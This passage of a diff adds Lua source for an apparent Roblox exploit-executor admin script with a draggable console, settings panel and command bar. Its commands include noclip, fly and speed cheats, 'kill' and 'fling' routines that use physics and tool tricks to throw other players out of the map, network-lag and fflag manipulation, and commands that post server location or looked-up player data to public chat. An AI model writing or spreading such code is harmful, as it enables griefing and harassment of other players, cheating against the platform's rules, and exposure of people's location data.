+				EventStorage.Noclip = RunService.Stepped:Connect(function()
+					for _, child in pairs(Player.Character:GetDescendants()) do
+						if child:IsA("BasePart") and child.CanCollide == true then
+							child.CanCollide = false
+						end
+					end
+				end)
+			end,
+		},
+		["clip"] = {
+			Args = {},
+			Alias = {},
+			Function = function()
+				if EventStorage.Noclip then 
+					EventStorage.Noclip:Disconnect() EventStorage.Noclip = nil
+				end
+			end,
+		},
+		["fly"] = {
+			Args = {},
+			Alias = {},
+			Function = function()
+				if not Flying then
+					local Player = game:GetService("Players").LocalPlayer
+					local Character = Player.Character
+					local Root = Character.HumanoidRootPart
+
+					Flying = true
+
+					local Speed = 50
+
+					local Controls = {
+						Left = 0,
+						Right = 0,
+						Forward = 0,
+						Back = 0,
+						Up = 0,
+						Down = 0,
+					}
+
+					local BodyGyro = Instance.new("BodyGyro"); do
+						BodyGyro.P = 9e4
+						BodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+						BodyGyro.CFrame = Root.CFrame
+						BodyGyro.Parent = Root
+					end
+
+					local BodyVelocity = Instance.new("BodyVelocity"); do
+						BodyVelocity.Velocity = Vector3.new(0, 0, 0)
+						BodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+						BodyVelocity.Parent = Root
+					end
+
+					Character.Humanoid.PlatformStand = true
+
+					EventStorage.FlyInputBegan = UserInputService.InputBegan:Connect(function(Key)
+						if Key.KeyCode == Enum.KeyCode.W then
+							Controls.Forward = 1
+						elseif Key.KeyCode == Enum.KeyCode.S then
+							Controls.Back = - 1
+						elseif Key.KeyCode == Enum.KeyCode.A then
+							Controls.Left = - 1
+						elseif Key.KeyCode == Enum.KeyCode.D then 
+							Controls.Right = 1
+						elseif Key.KeyCode == Enum.KeyCode.E then
+							Controls.Up = 1*2
+						elseif Key.KeyCode == Enum.KeyCode.Q then
+							Controls.Down = -1*2
+						end
+					end)
+
+					EventStorage.FlyInputEnd = UserInputService.InputEnded:Connect(function(Key)
+						if Key.KeyCode == Enum.KeyCode.W then
+							Controls.Forward = 0
+						elseif Key.KeyCode == Enum.KeyCode.S then
+							Controls.Back =  0
+						elseif Key.KeyCode == Enum.KeyCode.A then
+							Controls.Left =  0
+						elseif Key.KeyCode == Enum.KeyCode.D then 
+							Controls.Right = 0
+						elseif Key.KeyCode == Enum.KeyCode.E then
+							Controls.Up = 0
+						elseif Key.KeyCode == Enum.KeyCode.Q then
+							Controls.Down = 0
+						end
+					end)
+
+					Player.CharacterAdded:Connect(function()
+						Commands["unfly"].Function()
+					end)
+
+					while Flying do
+						local Speed = Controls.Left == 0 and  Controls.Right == 0 and Controls.Forward == 0 and  Controls.Back == 0 and  Controls.Down == 0 and Controls.Up == 0 and 0 or 50
+						if (Controls.Left + Controls.Right) ~= 0 or (Controls.Forward + Controls.Back) ~= 0 or (Controls.Down + Controls.Up) ~= 0 then
+							BodyVelocity.Velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (Controls.Forward + Controls.Back)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(Controls.Left + Controls.Right, (Controls.Forward + Controls.Back + Controls.Down + Controls.Up) * 0.2, 0).Position) - workspace.CurrentCamera.CoordinateFrame.p)) * Speed
+						else
+							BodyVelocity.Velocity = Vector3.new(0, 0, 0)
+						end
+						BodyGyro.CFrame = workspace.CurrentCamera.CoordinateFrame
+						fwait()
+					end
+
+					BodyGyro:destroy()
+					BodyVelocity:destroy()
+					Player.Character.Humanoid.PlatformStand = false
+				end
+			end,
+		},
+		["unfly"] = {
+			Args = {},
+			Alias = {},
+			Function = function()
+				Flying = false
+				if EventStorage.FlyInputEnd then EventStorage.FlyInputEnd:Disconnect() end
+				if EventStorage.FlyInputBegan then EventStorage.FlyInputBegan:Disconnect() end
+			end,
+		},
+		["cleanfling"] = {
+			Args = {},
+			Alias = {},
+			Function = function()
+				local tool = Player.Character:FindFirstChildOfClass("Tool") or Player.Backpack:FindFirstChildOfClass("Tool")
+				if tool then
+					tool.Parent = Player.Backpack
+					tool.Handle.Massless = true
+					tool.GripPos = Vector3.new(5000, 5000, 5000)
+					Player.Character.HumanoidRootPart.CustomPhysicalProperties = PhysicalProperties.new(math.huge,math.huge,math.huge,math.huge,math.huge)
+					tool.Parent = Player.Backpack
+					tool.Parent = Player.Character
+					Commands["noclip"].Function()
+					fwait(.1+GetPing())
+					for i,v in pairs(Player.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
+						if string.find(v.Animation.AnimationId,"182393478") then
+							v:Stop()
+						end
+					end
+				end
+			end,
+		},
+		["datalimit"] = {
+			Args = {"KBPS"},
+			Alias = {},
+			Function = function(Args)
+				if tonumber(Args[1]) then
+					NetworkClient:SetOutgoingKBPSLimit(tonumber(Args[1]))
+				end
+			end,
+		},
+		["pathfind"] = {
+			Args = {"pathfindto"},
+			Alias = {},
+			Function = function(Args)
+				local Plr = ShortName(Args[1]);
+				if Plr then
+					Plr = Plr[1]
+					Commands["antifling"].Function()
+
+					local Character = Player.Character
+					local Humanoid = Character:WaitForChild("Humanoid")
+					local Root = Character:WaitForChild("HumanoidRootPart")
+					local Target = Plr.Character
+					local TRoot = Target:WaitForChild("HumanoidRootPart")
+
+					local Path = PathfindingService:CreatePath({
+						AgentHeight = 3,
+						WaypointSpacing = 10,
+						AgentCanJump = true,
+					})
+
+					while Character and Character.Parent do
+						Path:ComputeAsync(Root.Position,TRoot.Position)
+						for i=1,5 do
+							local Path1 = Path:GetWaypoints()[i]
+							if Path1 then
+								if Path1.Action == Enum.PathWaypointAction.Walk then
+									Humanoid:MoveTo(Path1.Position)--; Humanoid.MoveToFinished:Wait()
+									repeat fwait() until (Root.Position - Path1.Position).Magnitude < 4
+								elseif Path1.Action == Enum.PathWaypointAction.Jump then
+									Humanoid.Jump = true
+									fwait()
+								end
+							end
+						end
+					end
+				end
+			end,
+		},
+		["goto"] = {
+			Args = {},
+			Alias = {},
+			Function = function(Args)
+				local Plr = ShortName(Args[1]);
+				if Plr then
+					Player.Character.HumanoidRootPart.CFrame = Plr[1].Character:FindFirstChild("HumanoidRootPart") and Plr[1].Character.HumanoidRootPart.CFrame or Plr[1].Character:FindFirstChildOfClass("BasePart").CFrame
+				end
+			end,
+		},
+		["goto2"] = {
+			Args = {},
+			Alias = {},
+			Function = function(Args)
+				local Plr = ShortName(Args[1]);
+				if Plr then
+					Player.Character.HumanoidRootPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+					Player.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+					Player.Character.HumanoidRootPart.CFrame = Plr[1].Character:FindFirstChild("HumanoidRootPart") and Plr[1].Character.HumanoidRootPart.CFrame or Plr[1].Character:FindFirstChildOfClass("BasePart").CFrame
+				end
+			end,
+		},
+		["replicationlag"] = {
+			Args = {"number"},
+			Alias = {},
+			Function = function(Args)
+				if tonumber(Args[1]) then
+					settings():GetService("NetworkSettings").IncomingReplicationLag = tonumber(Args[1])/1000
+				end
+			end,
+		},
+		["psr"] = {
+			Args = {"number"},
+			Alias = {},
+			Function = function(Args)
+				if tonumber(Args[1]) then
+					setfflag("S2PhysicsSenderRate",tonumber(Args[1]) or 30)
+				end
+			end,
+		},
+		["speed"] = {
+			Args = {"number"},
+			Alias = {"walkspeed"},
+			Function = function(Args)
+				Player.Character:FindFirstChildOfClass('Humanoid').WalkSpeed = Args[1] and tonumber(Args[1]) or 16
+			end,
+		},
+		["gravity"] = {
+			Args = {"number"},
+			Alias = {},
+			Function = function(Args)
+				workspace.Gravity = Args[1] and tonumber(Args[1]) or 16
+			end,
+		},
+		["sit"] = {
+			Args = {},
+			Alias = {},
+			Function = function()
+				Player.Character:WaitForChild("Humanoid").Sit = true
+			end,
+		},
+		["split"] = {
+			Args = {},
+			Alias = {"r15split"},
+			Function = function()
+				if Player.Character:FindFirstChild("Waist",true) then
+					Player.Character.Character:FindFirstChild("Waist",true):Destroy()
+				end
+			end,
+		},
+		["kill"] = {
+			Args = {"Player"},
+			Alias = {"toolkill"},
+			Function = function(Args)
+				local ToPlr = ShortName(Args[1]); if ToPlr then ToPlr = ToPlr[1]
+					local tool = Player.Character:FindFirstChildOfClass("Tool") or Player.Backpack:FindFirstChildOfClass("Tool")
+					if tool then
+						tool.Parent = Player.Backpack
+
+						local Humanoid = Player.Character.Humanoid do
+							local FakeHum = Humanoid:Clone()
+							Humanoid.Name = ""
+							FakeHum.Parent = Player.Character
+							Humanoid:Destroy()
+						end
+
+						tool.Parent = Player.Character
+						AttachToPlayer(ToPlr,CFrame.new(),true)
+						tool:GetPropertyChangedSignal("Parent"):Wait(); if tool.Parent == ToPlr.Character then
+							ClearConnections("Attachments")
+							local Root = Player.Character.HumanoidRootPart
+							repeat
+								Root.CFrame = CFrame.new(999999, workspace.FallenPartsDestroyHeight + 1,999999)
+								fwait()
+							until not ToPlr.Character or not Root or not ToPlr.Character:FindFirstChild("HumanoidRootPart") or not Root.Parent
+						end
+					end
+				end
+			end,
+		},
+		["fling"] = {
+			Args = {"Player"},
+			Alias = {"velocitykill","flingkill"},
+			Function = function(Args)
+				local ToPlr = ShortName(Args[1]); if ToPlr then ToPlr = ToPlr[1]
+					local Root = Player.Character:WaitForChild("HumanoidRootPart")
+					local Origin = Root.CFrame
+					Commands["noclip"].Function()
+					AttachToPlayer(ToPlr,CFrame.new(),true)
+					PreventSleeping(Player.Character.HumanoidRootPart)
+					fwait(.1+GetPing(750))--GetPing(750))
+					Root:WaitForChild("BodyAngularVelocity").AngularVelocity = Vector3.new(2147483646,0,0)
+					repeat 
+						fwait()
+					until not ToPlr.Character or not ToPlr.Character:FindFirstChild("HumanoidRootPart") or ToPlr.Character.HumanoidRootPart.Velocity.Magnitude >= 100 or ToPlr.Character.HumanoidRootPart.RotVelocity.Magnitude >= 100
+					ClearConnections("SleepEvent")
+					ClearConnections("Attachments")
+					Commands["clip"].Function()
+					Root:WaitForChild("BodyAngularVelocity"):Destroy()
+					Root:WaitForChild("BodyVelocity"):Destroy()
+					for i=1,3 do
+						Root.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+						Root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+						Root.CFrame = Origin
+						fwait()
+					end
+				end
+			end,
+		},
+		["printvelocity"] = {
+			Args = {"Player"},
+			Alias = {},
+			Function = function(Args)
+				local ToPlr = ShortName(Args[1],true); if ToPlr then 
+					for i,v in pairs(ToPlr) do
+						for i,part in pairs(v.Character:GetChildren()) do
+							if part:IsA("BasePart") then
+								printconsole(v.Name,part.Name,RoundNumber(part.Velocity.X) .. "," .. RoundNumber(part.Velocity.Y) .. "," .. RoundNumber(part.Velocity.Z))
+							end
+						end
+					end
+				end
+			end,
+		},
+		["printtotalvelocity"] = {
+			Args = {"Player"},
+			Alias = {"printmagnitude"},
+			Function = function(Args)
+				local ToPlr = ShortName(Args[1],true); if ToPlr then 
+					for i,v in pairs(ToPlr) do
+						for i,part in pairs(v.Character:GetChildren()) do
+							if part:IsA("BasePart") then
+								printconsole(v.Name,part.Name,RoundNumber(part.Velocity.Magnitude))
+							end
+						end
+					end
+				end
+			end,
+		},
+		["printserverinfo"] = {
+			Args = {},
+			Alias = {},
+			Function = function()
+				if Global.ServerInfo then
+					printconsole("Connected to " .. Global.ServerInfo.State .. ", " .. Global.ServerInfo.City .. " in " .. Global.ServerInfo.Country)	
+				else
+					printconsole("No Global.ServerInfo","Please use the autoexecute provided by TimedMarch")
+				end
+			end,
+		},
+		["printplayerinfo"] = {
+			Args = {"Player"},
+			Alias = {"serverinfo","serverlocation"},
+			Function = function(Args)
+				if Global.GetPlayerData and Args[1] then
+					local Found = ShortName(Args[1])
+					printconsole(Global.GetPlayerData(Found and Found[1].Name or Args[1]))
+				else
+					printconsole("No RoTracker","Please ask ProductionTakeOne for RoTracker")
+				end
+			end,
+		},
+		["chatserverinfo"] = {
+			Args = {},
+			Alias = {"serverinfo","serverlocation"},
+			Function = function()
+				if Global.ServerInfo then
+					fwait(GetPing(900))
+					ChatRemote:FireServer("Connected to " .. Global.ServerInfo.State .. ", " .. Global.ServerInfo.City .. " in " .. Global.ServerInfo.Country,"All")
+				else
+					printconsole("No Global.ServerInfo","Please use the autoexecute provided by TimedMarch")
+				end
+			end,
+		},
+		["chatplayerinfo"] = {
+			Args = {"Player"},
+			Alias = {"serverinfo","serverlocation"},
+			Function = function(Args)
+				if Global.GetPlayerData and Args[1] then
+					fwait(GetPing(900))
+					local Found = ShortName(Args[1])
+					ChatRemote:FireServer(Global.GetPlayerData(Found and Found[1].Name or Args[1]),"All")
+				else
+					printconsole("No RoTracker","Please ask TimedMarch for RoTracker")
+				end
+			end,
+		},
+		["printmass"] = {
+			Args = {"Player"},
+			Alias = {},
+			Function = function(Args)
+				local ToPlr = ShortName(Args[1],true); if ToPlr then 
+					for i,v in pairs(ToPlr) do
+						local Mass = 0
+						for i,part in pairs(v.Character:GetChildren()) do
+							if part:IsA("BasePart") then
+								Mass += part.Mass
+							end
+						end
+						printconsole(v,Mass)
+					end
+				end
+			end,
+		},
+	 --[[
+	[""] = {
+		Args = {},
+		Alias = {},
+		Function = function()
+
+		end,
+	}, ]]
+	}
+	
+	local function Drag(DragFrame,ToDrag)
+		local dragToggle,dragInput,dragStart,startPos
+		local dragSpeed = 0
+		local function updateInput(input)
+			local Delta = input.Position - dragStart
+			ToDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+		end
+		DragFrame.InputBegan:Connect(function(input)
+			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
+				dragToggle = true
+				dragStart = input.Position
+				startPos = ToDrag.Position
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						dragToggle = false
+					end
+				end)	
+			end
+		end)
+		DragFrame.InputChanged:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+				dragInput = input
+			end
+		end)
+		UserInputService.InputChanged:Connect(function(input)
+			if input == dragInput and dragToggle then
+				updateInput(input)
+			end
+		end)
+	end
+
+	local ScreenGui = Instance.new("ScreenGui"); do
+		ScreenGui.IgnoreGuiInset = true
+		ScreenGui.ResetOnSpawn = false
+		ScreenGui.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
+
+		Background = Instance.new("Frame"); do
+			Background.BackgroundColor3 = Color3.fromRGB(61,61,61)
+			Background.BackgroundTransparency = 0.5
+			Background.Name = "Background"
+			Background.Size = UDim2.new(1,0,1,0)
+
+			local Console = Instance.new("Frame"); do
+				Console.BackgroundColor3 = Color3.fromRGB(57,57,57)
+				Console.Name = "Console"
+				Console.Position = UDim2.new(0,20,0,30)
+				Console.Size = UDim2.new(0,400,0,200)
+
+				local UICorner = Instance.new("UICorner"); do
+					UICorner.CornerRadius = UDim.new(0,5)
+					UICorner.Parent = Console
+				end
+
+				local ImageLabel = Instance.new("ImageLabel"); do
+					ImageLabel.BackgroundColor3 = Color3.fromRGB(255,255,255)
+					ImageLabel.BackgroundTransparency = 1
+					ImageLabel.Image = "rbxassetid://4670964366"
+					ImageLabel.Position = UDim2.new(0,3,0,3)
+					ImageLabel.Size = UDim2.new(0,20,0,20)
+					ImageLabel.Parent = Console
+				end
+
+				local TextLabel = Instance.new("TextLabel"); do
+					TextLabel.AnchorPoint = Vector2.new(0.5,0)
+					TextLabel.BackgroundColor3 = Color3.fromRGB(255,255,255)
+					TextLabel.BackgroundTransparency = 2
+
+					do -- FontFace
+						TextLabel.FontFace.Weight = Enum.FontWeight.Regular
+						TextLabel.FontFace.Bold = false
+						TextLabel.FontFace.Family = "rbxasset://fonts/families/Ubuntu.json"
+						TextLabel.FontFace.Style = Enum.FontStyle.Normal
+					end
+					TextLabel.FontSize = Enum.FontSize.Size11
+					TextLabel.Position = UDim2.new(0.5,0,0,7)
+					TextLabel.Text = "Console"
+					TextLabel.TextColor3 = Color3.fromRGB(255,255,255)
+					TextLabel.TextSize = 11
+					TextLabel.TextWrap = true
+					TextLabel.TextWrapped = true
+					TextLabel.Size = UDim2.new(0,200,0,14)
+					TextLabel.Parent = Console
+				end
+
+				ConsoleScroll = Instance.new("ScrollingFrame"); do
+					ConsoleScroll.Active = true
+					ConsoleScroll.AnchorPoint = Vector2.new(0.5,1)
+					ConsoleScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+					ConsoleScroll.BackgroundColor3 = Color3.fromRGB(53,53,53)
+					ConsoleScroll.BorderSizePixel = 0
+					ConsoleScroll.BottomImage = "http://www.roblox.com/asset/?id=1195495135"
+					ConsoleScroll.CanvasSize = UDim2.new(0,0,0,0)
+					ConsoleScroll.MidImage = "http://www.roblox.com/asset/?id=1195495135"
+					ConsoleScroll.Position = UDim2.new(0.5,0,1,-3)
+					ConsoleScroll.ScrollBarImageColor3 = Color3.fromRGB(124,124,124)
+					ConsoleScroll.ScrollBarThickness = 6
+					ConsoleScroll.ScrollingDirection = Enum.ScrollingDirection.Y
+					ConsoleScroll.TopImage = "http://www.roblox.com/asset/?id=1195495135"
+					ConsoleScroll.Size = UDim2.new(0.98,-3,0.975,-25)
+
+					local UIListLayout = Instance.new("UIListLayout"); do
+						UIListLayout.Padding = UDim.new(0,2)
+						UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+						UIListLayout.Parent = ConsoleScroll
+					end
+
+					ConsoleExample = Instance.new("TextLabel"); do
+						ConsoleExample.BackgroundColor3 = Color3.fromRGB(255,255,255)
+						ConsoleExample.BackgroundTransparency = 1
+						ConsoleExample.TextWrapped = true
+
+						do -- FontFace
+							ConsoleExample.FontFace.Weight = Enum.FontWeight.Regular
+							ConsoleExample.FontFace.Bold = false
+							ConsoleExample.FontFace.Family = "rbxasset://fonts/families/Ubuntu.json"
+							ConsoleExample.FontFace.Style = Enum.FontStyle.Normal
+						end
+						
+						ConsoleExample.FontSize = Enum.FontSize.Size12
+						ConsoleExample.TextColor3 = Color3.fromRGB(255,255,255)
+						ConsoleExample.TextSize = 12
+						ConsoleExample.TextXAlignment = Enum.TextXAlignment.Left
+						ConsoleExample.Size = UDim2.new(1,-6,0,12)
+					end
+					
+					local EmptySpace = Instance.new("Frame"); do
+						EmptySpace.Size = UDim2.new(0,3,0,3)
+						EmptySpace.BackgroundTransparency = 1
+						EmptySpace.Parent = ConsoleScroll
+					end
+					
+					ConsoleScroll.Parent = Console
+				end
+				Console.Parent = Background
+				Drag(Console,Console)	
+			end
+
+			local Settings = Instance.new("Frame"); do
+				Settings.BackgroundColor3 = Color3.fromRGB(57,57,57)
+				Settings.Name = "Settings"
+				Settings.Position = UDim2.new(0,20,0,240)
+				Settings.Size = UDim2.new(0,400,0,200)
+
+				local UICorner_1 = Instance.new("UICorner"); do
+					UICorner_1.CornerRadius = UDim.new(0,5)
+					UICorner_1.Parent = Settings
+				end
+
+				local ImageLabel_1 = Instance.new("ImageLabel"); do
+					ImageLabel_1.BackgroundColor3 = Color3.fromRGB(255,255,255)
+					ImageLabel_1.BackgroundTransparency = 1
+					ImageLabel_1.Image = "rbxassetid://4670964366"
+					ImageLabel_1.Position = UDim2.new(0,3,0,3)
+					ImageLabel_1.Size = UDim2.new(0,20,0,20)
+					ImageLabel_1.Parent = Settings
+				end
+
+				local TextLabel_2 = Instance.new("TextLabel"); do
+					TextLabel_2.AnchorPoint = Vector2.new(0.5,0)
+					TextLabel_2.BackgroundColor3 = Color3.fromRGB(255,255,255)
+					TextLabel_2.BackgroundTransparency = 2
+
+					do -- FontFace
+						TextLabel_2.FontFace.Weight = Enum.FontWeight.Regular
+						TextLabel_2.FontFace.Bold = false
+						TextLabel_2.FontFace.Family = "rbxasset://fonts/families/Ubuntu.json"
+						TextLabel_2.FontFace.Style = Enum.FontStyle.Normal
+					end
+					TextLabel_2.FontSize = Enum.FontSize.Size11
+					TextLabel_2.Position = UDim2.new(0.5,0,0,7)
+					TextLabel_2.Text = "Settings"
+					TextLabel_2.TextColor3 = Color3.fromRGB(255,255,255)
+					TextLabel_2.TextSize = 11
+					TextLabel_2.TextWrap = true
+					TextLabel_2.TextWrapped = true
+					TextLabel_2.Size = UDim2.new(0,200,0,14)
+					TextLabel_2.Parent = Settings
+				end
+
+				SettingsScroll = Instance.new("ScrollingFrame"); do
+					SettingsScroll.Active = true
+					SettingsScroll.AnchorPoint = Vector2.new(0.5,1)
+					SettingsScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+					SettingsScroll.BackgroundColor3 = Color3.fromRGB(53,53,53)
+					SettingsScroll.BorderSizePixel = 0
+					SettingsScroll.BottomImage = "http://www.roblox.com/asset/?id=1195495135"
+					SettingsScroll.CanvasSize = UDim2.new(0,0,0,0)
+					SettingsScroll.MidImage = "http://www.roblox.com/asset/?id=1195495135"
+					SettingsScroll.Position = UDim2.new(0.5,0,1,-3)
+					SettingsScroll.ScrollBarImageColor3 = Color3.fromRGB(124,124,124)
+					SettingsScroll.ScrollBarThickness = 6
+					SettingsScroll.ScrollingDirection = Enum.ScrollingDirection.Y
+					SettingsScroll.TopImage = "http://www.roblox.com/asset/?id=1195495135"
+					SettingsScroll.Size = UDim2.new(0.98,-3,0.975,-25)
+
+					local UIListLayout_1 = Instance.new("UIListLayout"); do
+						UIListLayout_1.Padding = UDim.new(0,2)
+						UIListLayout_1.SortOrder = Enum.SortOrder.LayoutOrder
+						UIListLayout_1.Parent = SettingsScroll
+					end
+
+					SettingsExample = Instance.new("TextButton"); do
+						SettingsExample.BackgroundColor3 = Color3.fromRGB(68,68,68) -- Color3.fromRGB(247,104,2)
+						SettingsExample.Size = UDim2.new(0,20,0,20)
+						SettingsExample.Text = ""
+
+						local UICorner_2 = Instance.new("UICorner"); do
+							UICorner_2.CornerRadius = UDim.new(0,5)
+							UICorner_2.Parent = SettingsExample
+						end
+
+						local TextLabel_3 = Instance.new("TextLabel"); do
+							TextLabel_3.BackgroundColor3 = Color3.fromRGB(255,255,255)
+							TextLabel_3.BackgroundTransparency = 1
+
+							do -- FontFace
+								TextLabel_3.FontFace.Weight = Enum.FontWeight.Regular
+								TextLabel_3.FontFace.Bold = false
+								TextLabel_3.FontFace.Family = "rbxasset://fonts/families/Ubuntu.json"
+								TextLabel_3.FontFace.Style = Enum.FontStyle.Normal
+							end
+							TextLabel_3.FontSize = Enum.FontSize.Size18
+							TextLabel_3.Position = UDim2.new(1,3,0,0)
+							TextLabel_3.TextColor3 = Color3.fromRGB(255,255,255)
+							TextLabel_3.TextSize = 15
+							TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
+							TextLabel_3.Size = UDim2.new(0,380,1,0)
+							TextLabel_3.Parent = SettingsExample
+						end
+					end
+					
+					local EmptySpace = Instance.new("Frame"); do
+						EmptySpace.Size = UDim2.new(0,3,0,3)
+						EmptySpace.BackgroundTransparency = 1
+						EmptySpace.Parent = SettingsScroll
+					end
+					
+					SettingsScroll.Parent = Settings
+				end
+				Settings.Parent = Background
+			Drag(Settings,Settings)	
+			end
+
+			CommandBar = Instance.new("TextBox"); do
+				CommandBar.AnchorPoint = Vector2.new(0.5,0)
+				CommandBar.BackgroundColor3 = Color3.fromRGB(57,57,57)
+				CommandBar.BorderSizePixel = 0
+
+				do -- FontFace
+					CommandBar.FontFace.Weight = Enum.FontWeight.Regular
+					CommandBar.FontFace.Bold = false
+					CommandBar.FontFace.Family = "rbxasset://fonts/families/GothamSSm.json"
+					CommandBar.FontFace.Style = Enum.FontStyle.Normal
+				end
+				CommandBar.FontSize = Enum.FontSize.Size24
+				CommandBar.PlaceholderText = "Command Bar"
+				CommandBar.Position = UDim2.new(0.5,0,0,-70)
+				CommandBar.Text = ""
+				CommandBar.TextColor3 = Color3.fromRGB(255,255,255)
+				CommandBar.TextSize = 14
+				CommandBar.TextWrap = true
+				CommandBar.TextWrapped = true
+				CommandBar.ZIndex = 5
+				CommandBar.Size = UDim2.new(0.25,0,0,25)
+				CommandBar.Parent = Background
+				CommandBar.FocusLost:Connect(function(EnterPressed)
+					if EnterPressed then
+						local Args = string.split(CommandBar.Text," ")
+						local CommandName = string.lower(Args[1]); table.remove(Args,1)
+						if not Args[1] then Args[1] = "" end
+						for i,v in pairs(Commands) do
+							if i == CommandName or table.find(v.Alias,CommandName) then
+								task.defer(function()
+									Commands[i].Function(Args)
+								end)
+							end
+						end
+					end
+					CommandBar.Text = ""
+				end)
+			end
+
+			CommandsFrame = Instance.new("Frame"); do
+				CommandsFrame.BackgroundColor3 = Color3.fromRGB(53,53,53)
+				CommandsFrame.BorderSizePixel = 0
+				CommandsFrame.Name = "Commands"
+				CommandsFrame.Position = UDim2.new(0,429,0,30)
+				CommandsFrame.Size = UDim2.new(0,200,0,220)
+
+				local Frame_2 = Instance.new("Frame"); do
+					Frame_2.BackgroundColor3 = Color3.fromRGB(57,57,57)
+					Frame_2.BorderSizePixel = 0
+					Frame_2.Size = UDim2.new(1,0,0,25)
+
+					local TextButton = Instance.new("TextButton"); do
+						TextButton.AnchorPoint = Vector2.new(1,0)
+						TextButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
+						TextButton.BackgroundTransparency = 1
+
+						do -- FontFace
+							TextButton.FontFace.Weight = Enum.FontWeight.Regular
+							TextButton.FontFace.Bold = false
+							TextButton.FontFace.Family = "rbxasset://fonts/families/GothamSSm.json"
+							TextButton.FontFace.Style = Enum.FontStyle.Normal
+						end
+						TextButton.FontSize = Enum.FontSize.Size14
+						TextButton.Position = UDim2.new(1,0,0,0)
+						TextButton.Text = "X"
+						TextButton.TextColor3 = Color3.fromRGB(255,255,255)
+						TextButton.TextSize = 14
+						TextButton.Visible = false
+						TextButton.Size = UDim2.new(0,25,0,25)
+						TextButton.Parent = Frame_2
+						TextButton.Activated:Connect(function()
+							CommandsFrame.Visible = BackgroundToggle
+						end)
+						Drag(Frame_2,CommandsFrame)
+					end
+
+					local ImageLabel_2 = Instance.new("ImageLabel"); do
+						ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255,255,255)
+						ImageLabel_2.BackgroundTransparency = 1
+						ImageLabel_2.Image = "rbxassetid://4670964366"
+						ImageLabel_2.Position = UDim2.new(0,3,0,3)
+						ImageLabel_2.Size = UDim2.new(0,20,0,20)
+						ImageLabel_2.Parent = Frame_2
+					end
+
+					local TextLabel_5 = Instance.new("TextLabel"); do
+						TextLabel_5.AnchorPoint = Vector2.new(0.5,0)
+						TextLabel_5.BackgroundColor3 = Color3.fromRGB(255,255,255)
+						TextLabel_5.BackgroundTransparency = 2
+
+						do -- FontFace
+							TextLabel_5.FontFace.Weight = Enum.FontWeight.Regular
+							TextLabel_5.FontFace.Bold = false
+							TextLabel_5.FontFace.Family = "rbxasset://fonts/families/Ubuntu.json"
+							TextLabel_5.FontFace.Style = Enum.FontStyle.Normal
+						end
+						TextLabel_5.FontSize = Enum.FontSize.Size11
+						TextLabel_5.Position = UDim2.new(0.5,0,0,7)
+						TextLabel_5.Text = "Commands"
+						TextLabel_5.TextColor3 = Color3.fromRGB(255,255,255)
+						TextLabel_5.TextSize = 11
+						TextLabel_5.TextWrap = true
+						TextLabel_5.TextWrapped = true
+						TextLabel_5.Size = UDim2.new(0,200,0,14)
+						TextLabel_5.Parent = Frame_2
+					end
+					Frame_2.Parent = CommandsFrame
+				end
+
+				CommandsScroll = Instance.new("ScrollingFrame"); do
+					CommandsScroll.Active = true
+					CommandsScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+					CommandsScroll.BackgroundColor3 = Color3.fromRGB(255,255,255)
+					CommandsScroll.BackgroundTransparency = 1
+					CommandsScroll.CanvasSize = UDim2.new(0,0,0,0)
+					CommandsScroll.Position = UDim2.new(0,0,0,25)
+					CommandsScroll.ScrollBarThickness = 0
+					CommandsScroll.Size = UDim2.new(0,200,0,195)
+
+					local UIListLayout_2 = Instance.new("UIListLayout"); do
+						UIListLayout_2.Parent = CommandsScroll
+					end
+					CommandsScroll.Parent = CommandsFrame
+				end
+				CommandsFrame.Parent = Background
+			end
+			Background.Parent = ScreenGui
+		end
+		
+		if not pcall(function()
+				ScreenGui.Parent = Global.gethiddengui and Global.gethiddengui() or Global.gethui and Global.gethui() or  game:GetService("CoreGui"):FindFirstChild("RobloxGui") or game:GetService("CoreGui")
+			end) then
+			ScreenGui.Parent = Player:WaitForChild("PlayerGui")
+		end
+	end
+	
+	for i,v in pairs(Commands) do
+		local newlabel = Instance.new("TextLabel"); do
+			newlabel.BackgroundTransparency = 1
+			newlabel.Size = UDim2.new(1,0,0,20)
+			newlabel.Font = Enum.Font.Gotham
+			newlabel.TextSize = 14
+			newlabel.TextColor3 = Color3.fromRGB(247,104,2)
+			newlabel.Name = i
+
+			local TextValue = i
+			for i,v in pairs(v.Args) do
+				TextValue ..= " <" .. v .. ">"
+			end; newlabel.Text = TextValue
+
+			newlabel.Parent = CommandsScroll
+		end
+	end
+	
+	for i,v in pairs(Settings) do
+		local NewSetting = SettingsExample:Clone(); do
+			NewSetting.BackgroundColor3 = v and Color3.fromRGB(247,104,2) or Color3.fromRGB(68,68,68)
+			NewSetting:WaitForChild("TextLabel").Text = tostring(i)
+			NewSetting.Parent = SettingsScroll
+			NewSetting.Activated:Connect(function()
+				Settings[i] = not Settings[i]
+				NewSetting.BackgroundColor3 = Settings[i] and Color3.fromRGB(247,104,2) or Color3.fromRGB(68,68,68)
+				SaveSettings()
+			end)
+		end
+	end
+	
+	UserInputService.InputBegan:Connect(function(input,gameprocess)
+		if not gameprocess then
+			if input.KeyCode == Enum.KeyCode.LeftBracket then
+				Toggle = not Toggle
